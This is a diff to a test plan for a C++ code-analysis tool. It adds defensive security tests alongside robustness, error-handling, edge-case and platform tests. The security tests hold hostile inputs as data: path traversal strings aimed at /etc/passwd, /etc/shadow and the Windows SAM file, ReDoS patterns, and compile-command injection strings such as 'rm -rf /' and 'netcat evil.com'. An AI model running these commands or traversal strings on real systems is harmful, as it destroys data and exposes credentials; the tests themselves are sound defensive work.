+### 9.2 Integration Fixtures
 
 ```
 tests/fixtures/projects/
@@ -2015,10 +2915,13 @@ tests/fixtures/projects/
     └── CMakeLists.txt
 ```
 
-### 8.3 Test Utilities
+### 9.3 Test Utilities
 
 ```python
 # tests/test_utils.py
+import json
+from unittest import mock
+from contextlib import contextmanager
 
 def create_temp_project(num_files=5):
     """Create temporary project with N files"""
@@ -2036,9 +2939,596 @@ def temp_compile_commands(data):
     """Create temporary compile_commands.json"""
     pass
 
+@contextmanager
 def env_var(name, value):
     """Context manager for environment variables"""
+    import os
+    old_value = os.environ.get(name)
+    os.environ[name] = value
+    try:
+        yield
+    finally:
+        if old_value is None:
+            del os.environ[name]
+        else:
+            os.environ[name] = old_value
+
+def temp_dir():
+    """Context manager for temporary directory"""
     pass
+
+def temp_config_file(content):
+    """Create temporary config file with content"""
+    pass
+
+def temp_project_with_cc():
+    """Create temporary project with compile_commands.json"""
+    pass
+
+def modify_compile_commands(cc_path):
+    """Modify compile_commands.json for testing"""
+    pass
+
+def temp_project_structure():
+    """Create temp project with subdirectories"""
+    pass
+```
+
+---
+
+## 10. Security, Robustness, and Edge Case Tests (Critical Gaps)
+
+### REQ-SEC-1: Path Traversal and Injection Prevention
+
+#### Test-SEC-1.1-5: Comprehensive Security Tests
+- **Priority**: P0 (Critical)
+- **Test File**: `tests/security/test_path_security.py`
+- **Test Cases**:
+
+```python
+def test_comprehensive_path_traversal_attacks():
+    """CRITICAL: Test all path traversal attack vectors"""
+    analyzer = setup_test_analyzer()
+
+    dangerous_paths = [
+        "../../../etc/passwd",                     # Unix traversal
+        "..\\..\\..\\windows\\system32\\config\\sam",  # Windows traversal
+        "/etc/shadow",                             # Absolute Unix path
+        "C:\\Windows\\System32\\config\\sam",      # Windows absolute
+        "%2e%2e%2f%2e%2e%2f",                     # URL-encoded
+        "....//....//etc/passwd",                  # Double-dot bypass
+        "project/../../../etc/passwd",             # Mixed valid/invalid
+        "\\\\server\\share\\sensitive",            # UNC path
+        "file:///../../../etc/passwd",             # File URL scheme
+    ]
+
+    for path in dangerous_paths:
+        result = analyzer.find_in_file(path, ".*")
+        # Should either return empty, reject, or only return project files
+        if isinstance(result, list):
+            for item in result:
+                file_path = item.get("file", "")
+                # Must not access system files
+                assert "/etc/" not in file_path
+                assert "\\Windows\\System32\\" not in file_path.replace("/", "\\")
+
+def test_regex_dos_prevention():
+    """CRITICAL: Test protection against catastrophic backtracking"""
+    analyzer = setup_test_analyzer()
+
+    # Patterns known to cause catastrophic backtracking
+    malicious_patterns = [
+        "(a+)+b",           # Exponential backtracking
+        "(a*)*b",           # Exponential backtracking
+        "(a|a)*b",          # Exponential backtracking
+        "(a|ab)*c",         # Exponential backtracking
+        "([a-zA-Z]+)*d",    # Large character class repetition
+    ]
+
+    test_string = "a" * 30  # String that triggers backtracking
+
+    import time
+    for pattern in malicious_patterns:
+        start = time.time()
+        try:
+            # Should timeout or handle gracefully
+            results = analyzer.search_classes(pattern)
+            elapsed = time.time() - start
+            # Should complete within reasonable time (< 2 seconds)
+            assert elapsed < 2.0, f"Pattern {pattern} took {elapsed}s (potential ReDoS)"
+        except Exception as e:
+            # Pattern rejection is acceptable
+            assert "timeout" in str(e).lower() or "invalid" in str(e).lower()
+
+def test_command_injection_prevention():
+    """CRITICAL: Test compile_commands.json command injection prevention"""
+    malicious_commands = [
+        'clang++ file.cpp; rm -rf /',
+        'clang++ $(malicious_command) file.cpp',
+        'clang++ `backdoor` file.cpp',
+        'clang++ file.cpp & netcat evil.com',
+        'clang++ file.cpp | sh malicious.sh',
+    ]
+
+    for cmd in malicious_commands:
+        cc_data = [{
+            "directory": "/project",
+            "file": "/project/test.cpp",
+            "command": cmd
+        }]
+
+        with temp_compile_commands(cc_data) as cc_path:
+            manager = CompileCommandsManager(cc_path.parent, {})
+            args = manager.get_compile_args(Path("/project/test.cpp"))
+
+            # Commands should be parsed for flags only, never executed
+            # Verify no shell metacharacters in final args
+            for arg in args:
+                assert ";" not in arg
+                assert "|" not in arg
+                assert "&" not in arg
+                assert "$(" not in arg
+                assert "`" not in arg
+
+def test_symlink_attack_prevention():
+    """CRITICAL: Test symlink attack prevention"""
+    with temp_project() as project:
+        # Create symlink to sensitive file
+        sensitive_file = "/etc/passwd"
+        if os.path.exists(sensitive_file):
+            symlink_path = project / "evil_symlink.cpp"
+            try:
+                os.symlink(sensitive_file, symlink_path)
+
+                analyzer = CppAnalyzer(project)
+                analyzer.index_project()
+
+                # Should not index content from outside project
+                results = analyzer.search_symbols(".*")
+                # No symbols from /etc/passwd should be indexed
+                assert len(results["classes"]) == 0
+                assert len(results["functions"]) == 0
+            except (OSError, PermissionError):
+                # Platform doesn't support symlinks
+                pass
+
+def test_malicious_config_values():
+    """HIGH: Test validation of malicious configuration values"""
+    malicious_configs = [
+        {"max_file_size_mb": 999999999},          # Integer overflow attempt
+        {"max_file_size_mb": -1},                  # Negative value
+        {"exclude_directories": ["../../../"]},    # Path traversal in config
+        {"diagnostics": {"level": "'; DROP TABLE"}},  # Injection attempt
+    ]
+
+    for config_data in malicious_configs:
+        with temp_config_file(json.dumps(config_data)) as config_path:
+            try:
+                config = CppAnalyzerConfig(config_path.parent)
+                # Should have safe defaults or validation
+                assert config.max_file_size_mb >= 0
+                assert config.max_file_size_mb <= 1000  # Reasonable limit
+            except (ValueError, ValidationError):
+                # Explicit rejection is acceptable
+                pass
+```
+
+### REQ-ROB-1: Data Integrity and Atomic Operations
+
+#### Test-ROB-1.1-4: Cache and Data Integrity
+- **Priority**: P0 (Critical)
+- **Test File**: `tests/robustness/test_data_integrity.py`
+- **Test Cases**:
+
+```python
+def test_atomic_cache_writes():
+    """CRITICAL: Verify cache writes are atomic (no partial files)"""
+    with temp_project() as project:
+        analyzer = CppAnalyzer(project)
+        analyzer.index_project()
+
+        cache_dir = analyzer.cache_manager.cache_dir
+        cache_file = cache_dir / "cache_info.json"
+
+        assert cache_file.exists()
+
+        # Simulate crash during write by checking for .tmp files
+        # Proper atomic write: write to .tmp, then rename
+        tmp_files = list(cache_dir.glob("*.tmp"))
+        # Should clean up temp files after successful write
+        assert len(tmp_files) == 0
+
+def test_malformed_json_cache_recovery():
+    """CRITICAL: Test recovery from corrupt cache files"""
+    with temp_project() as project:
+        analyzer1 = CppAnalyzer(project)
+        analyzer1.index_project()
+
+        cache_file = analyzer1.cache_manager.cache_dir / "cache_info.json"
+
+        # Corrupt cache with various malformations
+        corruptions = [
+            b'{"incomplete": ',              # Truncated JSON
+            b'{"valid": "json"}\x00\x00',   # Null bytes
+            b'\xff\xfe' + b'invalid',        # Invalid UTF-8
+            b'<html>not json</html>',        # Wrong format
+        ]
+
+        for corrupt_data in corruptions:
+            with open(cache_file, 'wb') as f:
+                f.write(corrupt_data)
+
+            # Should recover by rebuilding cache
+            analyzer2 = CppAnalyzer(project)
+            cache_loaded = analyzer2._load_cache()
+
+            # Either rejects corrupt cache or loads valid parts
+            assert cache_loaded == False or analyzer2.get_stats()["file_count"] >= 0
+
+def test_cache_consistency_after_interrupt():
+    """HIGH: Test cache consistency after interrupted indexing"""
+    with temp_project(num_files=20) as project:
+        analyzer = CppAnalyzer(project)
+
+        # Simulate interrupted indexing
+        # Index partially then mark as interrupted
+        analyzer.cache_manager.save_progress(
+            total_files=20,
+            indexed_files=10,
+            failed_files=0,
+            cache_hits=0,
+            last_index_time=1.0,
+            class_count=5,
+            function_count=15,
+            status="interrupted"
+        )
+
+        # On restart, should detect interrupted state
+        analyzer2 = CppAnalyzer(project)
+        progress = analyzer2.cache_manager.load_progress()
+
+        assert progress["status"] == "interrupted"
+
+        # Should successfully complete indexing
+        count = analyzer2.index_project()
+        assert count > 0
+
+        # Final status should be complete
+        final_progress = analyzer2.cache_manager.load_progress()
+        assert final_progress["status"] == "complete"
+
+def test_concurrent_cache_write_protection():
+    """HIGH: Test protection against concurrent cache corruption"""
+    with temp_project() as project:
+        # Two analyzers for same project
+        analyzer1 = CppAnalyzer(project)
+        analyzer2 = CppAnalyzer(project)
+
+        import threading
+        errors = []
+
+        def index_project(analyzer, errors_list):
+            try:
+                analyzer.index_project()
+            except Exception as e:
+                errors_list.append(e)
+
+        # Index concurrently
+        thread1 = threading.Thread(target=index_project, args=(analyzer1, errors))
+        thread2 = threading.Thread(target=index_project, args=(analyzer2, errors))
+
+        thread1.start()
+        thread2.start()
+        thread1.join()
+        thread2.join()
+
+        # At most one should fail due to locking
+        # Both should not corrupt the cache
+        cache_file = analyzer1.cache_manager.cache_dir / "cache_info.json"
+        assert cache_file.exists()
+
+        # Cache should be loadable
+        with open(cache_file) as f:
+            data = json.load(f)  # Should not raise JSON decode error
+            assert "class_index" in data
+```
+
+### REQ-ERR-1: Error Handling and Resilience
+
+#### Test-ERR-1.1-6: Comprehensive Error Handling
+- **Priority**: P0-P1 (Critical-High)
+- **Test File**: `tests/robustness/test_error_handling.py`
+- **Test Cases**:
+
+```python
+def test_file_permission_errors():
+    """HIGH: Test handling of file permission errors"""
+    with temp_project() as project:
+        test_file = project / "test.cpp"
+        test_file.write_text("class Test {};")
+
+        # Make file unreadable
+        import stat
+        os.chmod(test_file, 0o000)
+
+        try:
+            analyzer = CppAnalyzer(project)
+            count = analyzer.index_project()
+
+            # Should continue with other files
+            assert isinstance(count, int)
+
+            # Check that error was logged
+            # (Implementation-dependent)
+        finally:
+            # Cleanup: restore permissions
+            os.chmod(test_file, stat.S_IRUSR | stat.S_IWUSR)
+
+def test_disk_full_during_cache_write():
+    """HIGH: Test handling of disk full errors"""
+    with temp_project() as project:
+        analyzer = CppAnalyzer(project)
+        analyzer.index_project()
+
+        # Mock disk full error
+        original_save = analyzer.cache_manager.save_cache
+
+        def mock_save_disk_full(*args, **kwargs):
+            raise OSError(28, "No space left on device")  # ENOSPC
+
+        analyzer.cache_manager.save_cache = mock_save_disk_full
+
+        # Should handle gracefully
+        try:
+            analyzer.refresh_if_needed()
+            # Should continue in-memory even if cache fails
+            assert analyzer.get_stats()["class_count"] >= 0
+        except OSError as e:
+            # Explicit error is acceptable
+            assert "space" in str(e).lower()
+
+def test_corrupt_compile_commands_handling():
+    """HIGH: Test handling of malformed compile_commands.json"""
+    corruptions = [
+        '{invalid json',                    # Syntax error
+        '{"directory": "missing file"}',    # Missing required fields
+        '[{"malformed": }]',                # Invalid structure
+        'null',                             # Wrong type
+        '[]',                               # Empty but valid
+    ]
+
+    for corrupt_json in corruptions:
+        with temp_project() as project:
+            cc_path = project / "compile_commands.json"
+            cc_path.write_text(corrupt_json)
+
+            # Should fall back to hardcoded args
+            analyzer = CppAnalyzer(project)
+            assert analyzer.compile_commands_manager is not None
+
+            # Should still be able to index
+            count = analyzer.index_project()
+            assert isinstance(count, int)
+
+def test_empty_and_whitespace_files():
+    """MEDIUM: Test handling of empty and whitespace-only files"""
+    with temp_project() as project:
+        # Empty file
+        empty_file = project / "empty.cpp"
+        empty_file.write_text("")
+
+        # Whitespace only
+        whitespace_file = project / "whitespace.cpp"
+        whitespace_file.write_text("   \n\t\n   ")
+
+        analyzer = CppAnalyzer(project)
+        count = analyzer.index_project()
+
+        # Should handle without errors
+        assert count >= 0
+
+        # No symbols extracted
+        stats = analyzer.get_stats()
+        # May or may not index empty files (implementation-dependent)
+
+def test_null_bytes_in_source():
+    """MEDIUM: Test handling of null bytes in source files"""
+    with temp_project() as project:
+        bad_file = project / "nullbytes.cpp"
+        bad_file.write_bytes(b"class Test {\x00 void method(); };")
+
+        analyzer = CppAnalyzer(project)
+        count = analyzer.index_project()
+
+        # Should handle gracefully (skip or parse around null bytes)
+        assert isinstance(count, int)
+
+def test_extremely_long_symbol_names():
+    """MEDIUM: Test handling of very long symbol names"""
+    with temp_project() as project:
+        long_name = "A" * 5000
+        source = project / "long.cpp"
+        source.write_text(f"class {long_name} {{}};")
+
+        analyzer = CppAnalyzer(project)
+        count = analyzer.index_project()
+
+        # Should handle without truncation or error
+        results = analyzer.search_classes(long_name)
+        assert len(results) >= 0  # May or may not find based on limits
+```
+
+### REQ-EDGE-1: Boundary Conditions and Edge Cases
+
+#### Test-EDGE-1.1-4: Edge Case Coverage
+- **Priority**: P1-P2 (High-Medium)
+- **Test File**: `tests/edge_cases/test_boundaries.py`
+- **Test Cases**:
+
+```python
+def test_file_size_boundary_conditions():
+    """HIGH: Test exact file size limits"""
+    with temp_project() as project:
+        default_limit_mb = 10
+        limit_bytes = default_limit_mb * 1024 * 1024
+
+        # Just under limit (should index)
+        under_limit = project / "under.cpp"
+        under_limit.write_text("// " + "x" * (limit_bytes - 100))
+
+        # At exact limit (boundary)
+        at_limit = project / "at.cpp"
+        at_limit.write_text("// " + "x" * limit_bytes)
+
+        # Just over limit (should skip)
+        over_limit = project / "over.cpp"
+        over_limit.write_text("// " + "x" * (limit_bytes + 100))
+
+        analyzer = CppAnalyzer(project)
+        count = analyzer.index_project()
+
+        # Verify consistent boundary behavior
+        file_index = analyzer.file_index
+        # Implementation-dependent: which files are indexed
+
+def test_maximum_inheritance_depth():
+    """HIGH: Test very deep inheritance hierarchies"""
+    with temp_project() as project:
+        # Create 100-level deep inheritance
+        depth = 100
+        source = project / "deep.cpp"
+
+        code = []
+        for i in range(depth):
+            if i == 0:
+                code.append(f"class Base{i} {{}};")
+            else:
+                code.append(f"class Derived{i} : public Base{i-1} {{}};")
+
+        source.write_text("\n".join(code))
+
+        analyzer = CppAnalyzer(project)
+        count = analyzer.index_project()
+
+        # Should handle without stack overflow
+        assert count > 0
+
+        # Hierarchy queries should work
+        hierarchy = analyzer.get_class_hierarchy(f"Derived{depth-1}")
+        assert hierarchy is not None
+
+def test_many_function_overloads():
+    """MEDIUM: Test functions with many overloads"""
+    with temp_project() as project:
+        source = project / "overloads.cpp"
+
+        overloads = []
+        for i in range(50):
+            overloads.append(f"void overloaded(int arg{i}) {{}}")
+
+        source.write_text("\n".join(overloads))
+
+        analyzer = CppAnalyzer(project)
+        count = analyzer.index_project()
+
+        # All overloads should be indexed
+        results = analyzer.search_functions("overloaded")
+        assert len(results) == 50
+
+        # All should have unique signatures
+        sigs = [r["signature"] for r in results]
+        assert len(set(sigs)) == 50
+
+def test_concurrent_file_modification():
+    """HIGH: Test file modification during parsing"""
+    with temp_project() as project:
+        test_file = project / "modifying.cpp"
+        test_file.write_text("class Original {};")
+
+        analyzer = CppAnalyzer(project)
+
+        # Start indexing in thread
+        import threading
+        def index_project():
+            analyzer.index_project()
+
+        thread = threading.Thread(target=index_project)
+        thread.start()
+
+        # Modify file during indexing
+        import time
+        time.sleep(0.1)
+        test_file.write_text("class Modified {};")
+
+        thread.join()
+
+        # Should complete without crash
+        stats = analyzer.get_stats()
+        assert stats["file_count"] >= 0
+```
+
+### REQ-PLAT-1: Platform-Specific Tests
+
+#### Test-PLAT-1.1-3: Platform Compatibility
+- **Priority**: P1 (High)
+- **Test File**: `tests/platform/test_platform_specific.py`
+- **Test Cases**:
+
+```python
+@pytest.mark.skipif(sys.platform == "win32", reason="Unix-specific")
+def test_unix_file_permissions():
+    """HIGH: Test Unix file permission handling"""
+    with temp_project() as project:
+        # File with restricted permissions
+        restricted = project / "restricted.cpp"
+        restricted.write_text("class Test {};")
+        os.chmod(restricted, 0o000)
+
+        analyzer = CppAnalyzer(project)
+        try:
+            count = analyzer.index_project()
+            # Should skip inaccessible file
+        finally:
+            os.chmod(restricted, 0o644)
+
+@pytest.mark.skipif(sys.platform != "win32", reason="Windows-specific")
+def test_windows_path_separators():
+    """HIGH: Test Windows path separator handling"""
+    with temp_project() as project:
+        cc_data = [{
+            "directory": "C:\\project",
+            "file": "C:/project/mixed\\separators.cpp",  # Mixed separators
+            "command": "clang++ mixed\\separators.cpp"
+        }]
+
+        with temp_compile_commands(cc_data) as cc_path:
+            manager = CompileCommandsManager(cc_path.parent, {})
+            # Should normalize paths correctly
+            args = manager.get_compile_args(Path("C:/project/mixed/separators.cpp"))
+            assert args is not None
+
+@pytest.mark.skipif(sys.platform != "win32", reason="Windows-specific")
+def test_windows_max_path_length():
+    """HIGH: Test handling of Windows MAX_PATH (260 char) limit"""
+    with temp_project() as project:
+        # Create deeply nested path approaching limit
+        deep_path = project
+        for i in range(20):
+            deep_path = deep_path / f"level{i}"
+        deep_path.mkdir(parents=True, exist_ok=True)
+
+        long_file = deep_path / "file.cpp"
+        if len(str(long_file)) > 260:
+            # Test handling of path over limit
+            try:
+                long_file.write_text("class Test {};")
+                analyzer = CppAnalyzer(project)
+                count = analyzer.index_project()
+                # Should use long path API or handle gracefully
+                assert isinstance(count, int)
+            except OSError as e:
+                # Acceptable to fail with clear error on old Windows
+                pass
 ```
 
 ---
@@ -2072,6 +3562,8 @@ def env_var(name, value):
 - **Line Coverage**: 80%+ overall
 - **Branch Coverage**: 70%+ for critical paths
 - **Requirement Coverage**: 100% (every REQ-X.X tested)
+- **Edge Case Coverage**: Input validation, error conditions, platform-specific behavior
+- **Integration Coverage**: Cross-component interactions (caching + refresh, compile_commands + parsing, etc.)
 
 ---
 
